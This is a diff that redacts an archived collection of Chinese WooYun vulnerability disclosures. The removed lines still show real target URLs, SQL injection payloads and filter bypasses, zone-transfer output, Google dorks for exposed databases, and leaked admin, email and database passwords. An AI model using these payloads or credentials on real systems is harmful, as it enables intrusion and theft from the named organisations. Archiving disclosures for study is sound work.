+**POC**: 伪造csrc@c-ctrip.com搭建一个邮局服务器添加域名c-ctrip.com添加用户csrc自定义邮件发给自己（茫茫用户中的小小一个）(亲，某旅游平台邀请你去看5月28号的多啦A梦：伴我同行）
 
 **绕过**: 直接利用
 
-**修复**: 给个参考链接   http://www.openspf.org/SPF_Record_Syntax
+**修复**: 给个参考链接   https://example.com/[已脱敏]
 ---
 
 ---
@@ -27092,7 +27092,7 @@
 
 **详情**: 西部数码多用户计数器的网站counter.west263.com存在默认目录和文件名的数据库文件，可下载。数据库中有申请了西部数码多用户计数器的站长或网站管理员的用户信息，包括用户名和密码，而且密码是明文保存的，不应该啊。如果这些密码正好是注册用户所拥有的网站的管理员用户的密码，可能造成一大批网站被入侵。
 
-**POC**: 通过扫目录发现存在网站程序说明文件http://counter.west263.com/使用说明.txt，文件中有默认数据库目录和文件名，试了下默认数据库地址http://counter.west263.com/data/cfcount.mdb，可下载，如图1。下载数据库后看到了大量注册用户的信息，特别刺眼的是明文的密码，如图2。
+**POC**: 通过扫目录发现存在网站程序说明文件https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27101,7 +27101,7 @@
 
 ---
 ### [wooyun-2013-035356] 广西电信某服务器配置不当泄露大量内部培训资料及员工照片等
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 内部绝密信息泄漏
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 内部绝密信息泄漏
 
 **元思考**: 触发信号: 功能测试
 
@@ -27112,7 +27112,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 广西电信ftp服务器配置不当，导致内部敏感资料泄露，包括员工培训视频，照片，所有路由器，交换机密码泄露，中心机房路由配置文件相关密码泄露，网络拓扑图等等，信息量比较大，危害比较严重。地址：ftp://116.10.242.186/直接无任何访问控制，所有文件可直接下载！网络配置文件，所有交换机路由器密码泄露秘密....地市节点资料网络拓扑图照片神马的
+**详情**: 广西电信ftp服务器配置不当，导致内部敏感资料泄露，包括员工培训视频，照片，所有路由器，交换机密码泄露，中心机房路由配置文件相关密码泄露，网络拓扑图等等，信息量比较大，危害比较严重。地址：ftp://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -27136,7 +27136,7 @@
 
 **详情**: 旧证书是吊销了，不过RSA密钥没重新生成是要闹哪样？等于什么都没做，白烧了一个新wildcard证书的钱。。。
 
-**POC**: 旧证书：新证书：CRL：(http://gtssl2-crl.geotrust.com/gtssl2.crl)旧证书（序列号22 ef 5c）在4月15日被吊销，不过新旧证书的RSA公钥是一模一样的。
+**POC**: 旧证书：新证书：CRL：(https://example.com/[已脱敏])旧证书（序列号22 ef 5c）在4月15日被吊销，不过新旧证书的RSA公钥是一模一样的。
 
 **绕过**: 直接利用
 
@@ -27156,7 +27156,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: java scanner 2 20 http://tg.9you.com/
+**详情**: java scanner 2 20 https://example.com/[已脱敏]
 
 **POC**: File: WEB~1.CONDir: WEBSER~1Dir: APP_GL~1File: DEFAUL~1.ASPFile: DEFAUL~2.ASPFile: GLOBAL~1.ASADir: USERFI~1Dir: ASPNET~1
 
@@ -27166,8 +27166,8 @@
 ---
 
 ---
-### [wooyun-2015-0122472] 饿了么某系统绕过防护继续注入到进入多个系统(OA/邮箱/ehr/wiki/费控等)
-**厂商**: 饿了么 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0122472] 某外卖平台某系统绕过防护继续注入到进入多个系统(OA/邮箱/ehr/wiki/费控等)
+**厂商**: 某外卖平台 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 参数注入, 认证接口, 上传功能
 
@@ -27178,7 +27178,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先突破点是OA系统http://fast.ele.me/用的泛微的系统原先的上传注入都补了,抱着怀疑的态度继续尝试了之前爆过的注入点,发现了一些蛛丝马迹http://fast.ele.me/homepage/LoginHomepage.jsp?hpid=11&isfromportal=1提交 11-1e0返回正常 提交 11 and 1=1弹出非法字符由此可知并没有对hpid参数进行int()转换而是 加了过滤,不断尝试后发现/**/and/**/1=1可以绕过奇怪的是当写这篇报告的时候发现 貌似防护又没了 直接提交 and 1=1 也返回正常 不懂...同理 http://fast.ele.me:89/login.do 移动端的登录框POST也可以注入然后就是注出用户密码并登录,但是对所有用户开启了短信动态密码验证,猜测没有对sysadmin默认管理员开启 于是注出sysadmin的密
+**详情**: 首先突破点是OA系统https://example.com/[已脱敏] 11-1e0返回正常 提交 11 and 1=1弹出非法字符由此可知并没有对hpid参数进行int()转换而是 加了过滤,不断尝试后发现/**/and/**/1=1可以绕过奇怪的是当写这篇报告的时候发现 貌似防护又没了 直接提交 and 1=1 也返回正常 不懂...同理 https://example.com/[已脱敏] 移动端的登录框POST也可以注入然后就是注出用户密码并登录,但是对所有用户开启了短信动态密码验证,猜测没有对sysadmin默认管理员开启 于是注出sysadmin的密
 
 **POC**: 已证明
 
@@ -27188,8 +27188,8 @@
 ---
 
 ---
-### [wooyun-2012-07179] 新浪XX分站 直接爆后台的帐号跟密码
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-07179] 某社交平台XX分站 直接爆后台的帐号跟密码
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -27202,11 +27202,11 @@
 
 **详情**: 直接爆后台的帐号跟密码爆数据库的路经
 
-**POC**: http://g.tj.house.sina.com.cn/sinaCount/sysAdmin/default.aspxhttp://g.tj.house.sina.com.cn/sinaCount/sysAdmin/ct/default.aspx帐号:tjhouse 密码：tjsina2009http://g.tj.house.sina.com.cn/sinaCount/sysAdmin/login.aspx  后台入口
+**POC**: https://example.com/[已脱敏] 密码：tjsina2009https://example.com/[已脱敏]  后台入口
 
 **绕过**: 直接利用
 
-**修复**: 继续求新浪公仔
+**修复**: 继续求某社交平台公仔
 ---
 
 ---
@@ -27233,7 +27233,7 @@
 
 ---
 ### [wooyun-2012-04386] 江苏移动某分站tomcat权限配置不当，可遍历目录
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -27244,9 +27244,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://song.js.chinamobile.com:8002/mod_user/mod/exterior/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://song.js.chinamobile.com:8002/mod_user/mod/exterior/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27266,9 +27266,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 谷歌搜索Powered by Vicworl该系统是通过安装布置的，所以都是统一的配置方式。win+apache我们知道win+apache有个缺陷就是可以通过短文件名访问文件。该系统的数据库备份文件在data/backup/目录下而且文件名的长度大于9个字符.所以通过短文件名，访问数据库备份文件，导致数据库被下载。案例http://ntzx.cn/data/backup/VICWOR~2.SQLhttp://v.wxxscm.com.cn/data/backup/VICWOR~2.SQLhttp://vod.czgd.cn/data/backup/VICWOR~1.SQLhttp://218.7.16.70/data/backup/VICWOR~1.SQLhttp://v.lhjy.net/data/backup/VICWOR~1.SQL
+**详情**: 谷歌搜索Powered by Vicworl该系统是通过安装布置的，所以都是统一的配置方式。win+apache我们知道win+apache有个缺陷就是可以通过短文件名访问文件。该系统的数据库备份文件在data/backup/目录下而且文件名的长度大于9个字符.所以通过短文件名，访问数据库备份文件，导致数据库被下载。案例https://example.com/[已脱敏]
 
-**POC**: http://ntzx.cn/data/backup/VICWOR~2.SQLhttp://v.wxxscm.com.cn/data/backup/VICWOR~2.SQLhttp://vod.czgd.cn/data/backup/VICWOR~1.SQLhttp://218.7.16.70/data/backup/VICWOR~1.SQLhttp://v.lhjy.net/data/backup/VICWOR~1.SQL
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27288,9 +27288,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 酷我音乐DNS域传送关于域传送 http://drops.wooyun.org/papers/64
+**详情**: 酷我音乐DNS域传送关于域传送 https://example.com/[已脱敏]
 
-**POC**: <code>; <<>> DiG 9.7.0-P1 <<>> @ns1.kuwo.cn. kuwo.cn axfr; (1 server found);; global options: +cmdkuwo.cn.		300	IN	SOA	ns1.kuwo.cn. root.kuwo.cn. 1383552166 28800 7200 7776000 86400kuwo.cn.		300	IN	A	221.238.18.57kuwo.cn.		300	IN	A	221.238.18.58kuwo.cn.		300	IN	NS	ns1.koowo.com.kuwo.cn.		300	IN	NS	n
+**POC**: <code>; <<>> DiG 9.7.0-P1 <<>> @ns1.kuwo.cn. kuwo.cn axfr; (1 server found);; global options: +cmdkuwo.cn.		300	IN	SOA	ns1.kuwo.cn. root.kuwo.cn. 1383552166 28800 7200 7776000 86400kuwo.cn.		300	IN	A	[IP已脱敏]kuwo.cn.		300	IN	A	[IP已脱敏]kuwo.cn.		300	IN	NS	ns1.koowo.com.kuwo.cn.		300	IN	NS	n
 
 **绕过**: 直接利用
 
@@ -27310,9 +27310,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 服务器安全配置不当，导致区域传送。C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> moc.gov.cnServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:moc.gov.cn      nameserver = ns.moc.gov.cnmoc.gov.cn      nameserver = mocbk.moc.gov.cn> server mocbk.moc.gov.cnDefault Server:  mocbk.moc.gov.cnAddress:  219.143.23
+**详情**: 服务器安全配置不当，导致区域传送。C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> moc.gov.cnServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:moc.gov.cn      nameserver = ns.moc.gov.cnmoc.gov.cn      nameserver = mocbk.moc.gov.cn> server mocbk.moc.gov.cnDefault Server:  mocbk.moc.gov.cnAddress:  219.143.23
 
-**POC**: C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> moc.gov.cnServer:  google-public-dns-a.google.comAddress:  8.8.8.8Non-authoritative answer:moc.gov.cn      nameserver = ns.moc.gov.cnmoc.gov.cn      nameserver = mocbk.moc.g
+**POC**: C:\Documents and Settings\Administrator>nslookupDefault Server:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> moc.gov.cnServer:  google-public-dns-a.google.comAddress:  [IP已脱敏]Non-authoritative answer:moc.gov.cn      nameserver = ns.moc.gov.cnmoc.gov.cn      nameserver = mocbk.moc.g
 
 **绕过**: 直接利用
 
@@ -27332,7 +27332,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://219.141.185.85/http://ufsdp.ufida.com/Default.aspx?Rurl=http%3a%2f%2f219.141.185.85%3a80%2flogin.aspx系统存在IIS写权限漏洞，导致直接上传可执行文件
+**详情**: http://[IP已脱敏]
 
 **POC**: 看了一下，发现上面早有人检测过了。。。
 
@@ -27343,7 +27343,7 @@
 
 ---
 ### [wooyun-2013-024615] 江苏号码百事通房产交易平台FCKeditor双传、遍历漏洞
-**厂商**: 中国电信 | **年份**: 2013 | **类型**: 应用配置错误
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -27376,7 +27376,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://pay.kuaikuai.cn/pay/payagreement.action老生常谈了，不解释www
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如图所示www
 
@@ -27398,9 +27398,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先网址是http://218.75.115.150:8080又是IIS PUT刚才还说政府类的这么多，这次来个新闻的，无语了具体不多说，看图泄露的挺多，然后多做做修复吧
+**详情**: 首先网址是http://[IP已脱敏]又是IIS PUT刚才还说政府类的这么多，这次来个新闻的，无语了具体不多说，看图泄露的挺多，然后多做做修复吧
 
-**POC**: 首先网址是http://218.75.115.150:8080又是IIS PUT刚才还说政府类的这么多，这次来个新闻的，无语了具体不多说，看图泄露的挺多，然后多做做修复吧
+**POC**: 首先网址是http://[IP已脱敏]又是IIS PUT刚才还说政府类的这么多，这次来个新闻的，无语了具体不多说，看图泄露的挺多，然后多做做修复吧
 
 **绕过**: 直接利用
 
@@ -27444,7 +27444,7 @@
 
 **详情**: 可以执行任意代码
 
-**POC**: http://benyouhui.it168.com/robots.txt/.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27464,7 +27464,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 来看下网址：http://www.dzbchina.comIP地址：222.133.6.18下面看下结果：Host's addresses:__________________dzbchina.com.                            3600     IN    A        222.133.6.18Wildcard detection using: scprwpdzynka_______________________________________scprwpdzynka.dzbchina.com.               30       IN    A        219.146.13.36!!!!!!!!!!!!!!!!!!!!!!!!!!!!Wildcards detected, all subdomains will point to the
+**详情**: 来看下网址：https://example.com/[已脱敏]'s addresses:__________________dzbchina.com.                            3600     IN    A        [IP已脱敏]Wildcard detection using: scprwpdzynka_______________________________________scprwpdzynka.dzbchina.com.               30       IN    A        [IP已脱敏]!!!!!!!!!!!!!!!!!!!!!!!!!!!!Wildcards detected, all subdomains will point to the
 
 **POC**: 如图：
 
@@ -27496,8 +27496,8 @@
 ---
 
 ---
-### [wooyun-2015-0147179] 美团网某处内部邮箱账号泄露可登录（已连接vpn）
-**厂商**: 美团网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0147179] 某外卖平台网某处内部邮箱账号泄露可登录（已连接vpn）
+**厂商**: 某外卖平台网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -27508,9 +27508,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/enchanterhoo/aa/blob/fd1d283d8ef59c4dcb28ef9636373d354037fa2b/proj/config.py账号：guoning04@meituan.com密码：Mimacuowu951753有动态口令了，不过客户端可以接收
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 拨vpn进内网接口: 10.65.12.161 --- 0x14Internet 地址         物理地址              类型10.65.12.129          00-*********-5b     动态10.65.12.255          ff-*********-ff     静态
+**POC**: 拨vpn进内网接口: [IP已脱敏] --- 0x14Internet 地址         物理地址              类型10.65.12.129          00-*********-5b     动态10.65.12.255          ff-*********-ff     静态
 
 **绕过**: 直接利用
 
@@ -27530,9 +27530,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看了Aerfa21提交的漏洞，自己也在网上找了找。终于找到了。通过nslookup -qt=txt cofco.com  发现cofco.com没有配置SPFSPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的用winmail 配置cofco域名的邮件服务器。新建server和test用户给qq邮箱发送邮件发现，cofco的域名已经被举报，无法正常给qq邮箱发送邮件。成功以server@cofco.com邮箱的身份给163邮箱发送邮件。目的不纯者可以使用cofco.com这个邮箱的漏洞进行钓鱼等操作。
+**详情**: 看了Aerfa21提交的漏洞，自己也在网上找了找。终于找到了。通过nslookup -qt=txt cofco.com  发现cofco.com没有配置SPFSPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的用winmail 配置cofco域名的邮件服务器。新建server和test用户给某互联网公司邮箱发送邮件发现，cofco的域名已经被举报，无法正常给某互联网公司邮箱发送邮件。成功以server@cofco.com邮箱的身份给163邮箱发送邮件。目的不纯者可以使用cofco.com这个邮箱的漏洞进行钓鱼等操作。
 
-**POC**: 看了Aerfa21提交的漏洞，自己也在网上找了找。终于找到了。通过nslookup -qt=txt cofco.com  发现cofco.com没有配置SPFSPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的用winmail 配置cofco域名的邮件服务器。新建server和test用户给qq邮箱发送邮件发现，cofco的域名已经被举报，无法正常给qq邮箱发送邮件。成功以server@cofco.com邮箱的身份给163邮箱发送邮件。目的不纯者可以使用cofco.com这个邮箱的漏洞进行
+**POC**: 看了Aerfa21提交的漏洞，自己也在网上找了找。终于找到了。通过nslookup -qt=txt cofco.com  发现cofco.com没有配置SPFSPF是跟DNS相关的一项技术，它的内容写在DNS的txt类型的记录里面。SPF的作用跟mx相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的用winmail 配置cofco域名的邮件服务器。新建server和test用户给某互联网公司邮箱发送邮件发现，cofco的域名已经被举报，无法正常给某互联网公司邮箱发送邮件。成功以server@cofco.com邮箱的身份给163邮箱发送邮件。目的不纯者可以使用cofco.com这个邮箱的漏洞进行
 
 **绕过**: 直接利用
 
@@ -27554,7 +27554,7 @@
 
 **详情**: 猫扑大杂烩一遍历。
 
-**POC**: <img src="http://imgv.zol.com.cn/video/1/796/cev5U78I9gXTU.jpg" />http://dzh2.mop.com/admin/
+**POC**: <img src="https://example.com/[已脱敏]" />https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27574,7 +27574,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 源码下载地址：http://staff.uestc.edu.cn/staff.zip
+**详情**: 源码下载地址：https://example.com/[已脱敏]
 
 **POC**: /staff/config/config.php<?php$config = array(/*网站配置*/"WEB_STATE" => "on","WEB_NAME" => "电子科技大学教师个人主页","WEB_DEBUG" => 1,"WEB_DEBUG_IP" => array("")  ,       //调试程序的ip列表"WEB_MANAGE_IP" => array(""),  //进入后台的ip/*数据库配置*/"DB_HOST" => "localhost" ,"DB_USER" => "root" ,"DB_PASSWD" => "xxzx4056" , //数据库密码，移
 
@@ -27640,7 +27640,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: googleinurl:sql.php 知名架构数据库名字如 dede phpcmsinurl:tbl_structure.php 任何你想到的。例子：inurl:tbl_structure.php love第一个链接http://www.love-***.com/my/sql.php?db=ecshop&lang=en-utf-8&convcharset=iso-8859-1&collation_connection=utf8_general_ci&token=a9bf48954d59c98098ba16944b0b8449&table=ecs_stats&goto=tbl_structure.php谷歌Pr 还挺高，达到了6
+**详情**: googleinurl:sql.php 知名架构数据库名字如 dede phpcmsinurl:tbl_structure.php 任何你想到的。例子：inurl:tbl_structure.php love第一个链接https://example.com/[已脱敏] 还挺高，达到了6
 
 **POC**: phpmyadmin很多的都是root权限，获取shell 轻而易举phpmyadmin 暴路径  weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php
 
@@ -27662,7 +27662,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.ceboss.cn/SalesManager/portal/jsp/portal/index.jsp用户名/密码：liyun@xinnet.com/liyun@xinnet.com比之前那个功能还要多····这个先随便点一个用户邮箱名字···点击查看IP，可以看到用户的所有根域名和真实IP地址。看了看源代码，有些功能需要满足特定条件才能使用，前台并没有发现。直接判断的出custID= 是用户的ID，可以遍历可以修改DNS，域名密码，域名转出，查看域名注册人信息。拿中国银行的来说，可以修改密码，原密码是自动填写的，只需要写新密码即可，如果需要知道原密码也可以通过抓包获取···这个是另一个域名抓包的，不敢拿银行搞，可以看到域名原密码是v2C9f3Z4m5。可以修改DNS。可以遍历用户ID批量获取中国银行的域名也在我手上。找个小域名测试一下只要支付38元手续费即可转入域名·
+**详情**: https://example.com/[已脱敏] 是用户的ID，可以遍历可以修改DNS，域名密码，域名转出，查看域名注册人信息。拿中国银行的来说，可以修改密码，原密码是自动填写的，只需要写新密码即可，如果需要知道原密码也可以通过抓包获取···这个是另一个域名抓包的，不敢拿银行搞，可以看到域名原密码是v2C9f3Z4m5。可以修改DNS。可以遍历用户ID批量获取中国银行的域名也在我手上。找个小域名测试一下只要支付38元手续费即可转入域名·
 
 **POC**: (见原文)
 
@@ -27673,7 +27673,7 @@
 
 ---
 ### [wooyun-2014-086495] 重庆联通多媒体广告系统运营配置不当(可控制三千多台广告设备)
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 认证接口, 后台管理
 
@@ -27684,7 +27684,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 怎么沦陷的？千篇一律。我简单说下，主要是证明危害。那天看到某洞主发布的jboss洞洞，于是手痒谷歌了下jmx-console，找到了某服务器泄漏的目录http://221.5.243.11:9090/%E6%9C%8D%E5%8A%A1%E5%99%A8/jboss-4.0.5.GA/server/default/deploy/jmx-console.war/WEB-INF/classes/org/jboss/jmx/发现里面都是各种mov，jpg，不知道是什么服务器。于是下了些mov观赏了下，都是些广告，大概知道了，一个广告的服务器。不过还是不知道哪个厂商，没办法提洞。继续往下找。。。看到的广告基本上都是联通的，而且ip138了一下，重庆联通adsl，到这里猜到八分了。继续往下找。。。发现一个备份喔，no。一整个系统的配置都在里面，数据库配置、ftp。于是连上数据库，额，用户表密码明文。
+**详情**: 怎么沦陷的？千篇一律。我简单说下，主要是证明危害。那天看到某洞主发布的jboss洞洞，于是手痒谷歌了下jmx-console，找到了某服务器泄漏的目录http://[IP已脱敏]
 
 **POC**: 首页终端终端数量，3000多台设备，覆盖各种小区公共场所，影响可谓深广查看终端维护功能
 
@@ -27706,7 +27706,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 青岛市政府互联网出口防火墙，天融信：https://119.167.245.100存在Openssl漏洞，可获取管理员用户名及密码mask 区域*****6E 61 6D 65 3D 73 75**********77 64 3D 73 75 70 **********4F 4D 40 33 26 6C **********0 74 3D 58 73 E1  gi*****mask 区域*****密码：su*****成功登陆并控制：
+**详情**: 青岛市政府互联网出口防火墙，天融信：https://[IP已脱敏]存在Openssl漏洞，可获取管理员用户名及密码mask 区域*****6E 61 6D 65 3D 73 75**********77 64 3D 73 75 70 **********4F 4D 40 33 26 6C **********0 74 3D 58 73 E1  gi*****mask 区域*****密码：su*****成功登陆并控制：
 
 **POC**: (见原文)
 
@@ -27728,13 +27728,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ip: 42.121.107.82host: www.shunliu.com泄露网站数据和用户数据
+**详情**: ip: [IP已脱敏]host: www.shunliu.com泄露网站数据和用户数据
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考 http://drops.wooyun.org/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/2470
+**修复**: 参考 https://example.com/[已脱敏]
 ---
 
 ---
@@ -27750,7 +27750,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x00 存在update注入注入点：http://www.bszn.swust.edu.cn/index.php?s=/Guide/index/id/46 注入语句：and%201=(updatexml(1,concat(0x5e24,(select%20database()),0x5e24),1))其他语句类似，不在重复0x01 存在默认口令详情可访问：WooYun: 看我如何调查放置后门之Thinkphp
+**详情**: 0x00 存在update注入注入点：https://example.com/[已脱敏] 注入语句：and%201=(updatexml(1,concat(0x5e24,(select%20database()),0x5e24),1))其他语句类似，不在重复0x01 存在默认口令详情可访问：WooYun: 看我如何调查放置后门之Thinkphp
 
 **POC**: update报错注入证明默认口令证明
 
@@ -27760,8 +27760,8 @@
 ---
 
 ---
-### [wooyun-2012-04546] 中国电信又一域传送漏洞
-**厂商**: 中国电信 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-04546] 某运营商又一域传送漏洞
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -27778,7 +27778,7 @@
 
 **绕过**: 直接利用
 
-**修复**: ns.westidc.com.cn（221.236.9.9） 与 ns.westidc.net.cn（210.77.146.30） 都没有做访问控制定义ACL(访问控制列表)来限制在域名服务器之间的区域传送编辑/etc/named.conf在189store.com的zone配置中设置allow-t
+**修复**: ns.westidc.com.cn（[IP已脱敏]） 与 ns.westidc.net.cn（[IP已脱敏]） 都没有做访问控制定义ACL(访问控制列表)来限制在域名服务器之间的区域传送编辑/etc/named.conf在189store.com的zone配置中设置allow-t
 ---
 
 ---
@@ -27794,9 +27794,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载地址：http://www.whjz.org.cn/Foosun_Data/FS400.mdb
+**详情**: 下载地址：https://example.com/[已脱敏]
 
-**POC**: 下载地址：http://www.whjz.org.cn/Foosun_Data/FS400.mdb
+**POC**: 下载地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27840,7 +27840,7 @@
 
 **详情**: 
 
-**POC**: http://marketing.gtja.com/admin/login/login.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27882,9 +27882,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 思路是：inurl:http://c.highpin.cn/Job/JobChanceAnonymous?Encryptid=打开后http://c.highpin.cn/Job/JobChanceAnonymous?Encryptid=562C063659365E611F350769026B9&FromEmail=192C40360C361F6149355A69596B0F2C523629365A611A350569186B022C5A3604369&FromType=6点进入卓聘可怕的一幕出现了自动登陆了，什么都有了http://c.highpin.cn/Job/JobChanceAnonymous?Encryptid=562C033650365D6119350F69016B9&FromEmail=0D2C4036063601615F350369046B542C753658365D61
+**详情**: 思路是：inurl:https://example.com/[已脱敏]
 
-**POC**: http://c.highpin.cn/Job/JobChanceAnonymous?Encryptid=40615D66466152664761536642614&FromEmail=xuelang8445@163.com&FromType=14http://c.highpin.cn/Job/JobChanceAnonymous?Encryptid=562C03365B36586115350E69066B9&FromEmail=162C40360536026155355F69586B062C0D365C362B611D350069056B4F2C5636063606619&FromType=
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -27904,9 +27904,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: H.264 DVR，不知道中文怎么叫，该款摄像头，大量部署在世界各地。稳稳的40w个。IP ： http://189.180.16.235/ 出厂设置，账号密码： admin adminIP：http://113.182.179.91/IP：http://187.148.169.94/IP：http://175.141.5.65/太多了，真不能一一列举的。还请cncert国家互联网应急中心对该款摄像头进行一一排查，及时通知客户修改密码。
+**详情**: H.264 DVR，不知道中文怎么叫，该款摄像头，大量部署在世界各地。稳稳的40w个。IP ： http://[IP已脱敏] 出厂设置，账号密码： admin adminIP：http://[IP已脱敏]
 
-**POC**: IP：http://113.182.179.91/IP：http://187.148.169.94/
+**POC**: IP：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -27926,7 +27926,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # 任意文件可遍历下载，shadow、数据库文件均泄漏http://homesecurity.haier.com/HaierAF/login4webapp/downLoadFile.action?filePath=系统hash：mask 区域*****FfltDnGQhECVx8Lg7pirZ/fxB9xd0EgswAoV*****数据库配置：mask 区域*****ode**********//127.0.0.1**********sql.jdb**********hai**********d=ha**********cod*****# 后台口令不严，可登陆控制wsdl接口等http://homesecurity.haier.com/HaierAF/login4webapp/login.jsp账号：admin密码：123类可编辑com.cloud.webservice.webservic
+**详情**: # 任意文件可遍历下载，shadow、数据库文件均泄漏https://example.com/[已脱敏] 区域*****FfltDnGQhECVx8Lg7pirZ/fxB9xd0EgswAoV*****数据库配置：mask 区域*****ode**********//[IP已脱敏]**********sql.jdb**********hai**********d=ha**********cod*****# 后台口令不严，可登陆控制wsdl接口等https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -27948,7 +27948,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mobile.iciba.com/powerword/images/m2.jpg%00.php 截断http://office.wps.cn/images/li38ngvkpvjxk.jpg/1.php 爆路径http://office.wps.cn/robots.txt 泄漏后台地址http://apply.dajie.com/2012/pages/kingsoft/jobs.asp?did=300911000017 校园照片注入
+**详情**: https://example.com/[已脱敏] 截断https://example.com/[已脱敏] 爆路径https://example.com/[已脱敏] 泄漏后台地址https://example.com/[已脱敏] 校园照片注入
 
 **POC**: (见原文)
 
@@ -27992,9 +27992,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01:sql注射，均为cookie注入http://www.hebdgjh.com.cn/qzlx/sub.asp?cid=0001http://www.hebdgjh.com.cn/sub.asp?CID=002000010001http://www.hebdgjh.com.cn/dgsgk%5Csub.asp?CID=00070003http://www.hebdgjh.com.cn/dgsgk/sgk022.asp?CID=00040001http://www.hebdgjh.com.cn/dgsgk/sgk023.asp?CID=0002http://www.hebdgjh.com.cn/dgsgk/sgk02.asp?CID=00030003http://www.hebdgjh.com.cn/dgsgk/sgk02.asp?CID=0001如：http://www.hebdg
+**详情**: 0x01:sql注射，均为cookie注入https://example.com/[已脱敏]
 
-**POC**: Database: Microsoft_Access_masterdb[4 tables]+-------+| admin || jobs  || log   || news  |+-------+0x02:多处备份文件下载，包含confighttp://www.hebdgjh.com.cn/file.rarhttp://www.hebdgjh.com.cn/yhsgk.rarhttp://www.hebdgjh.com.cn/qzlx.rar
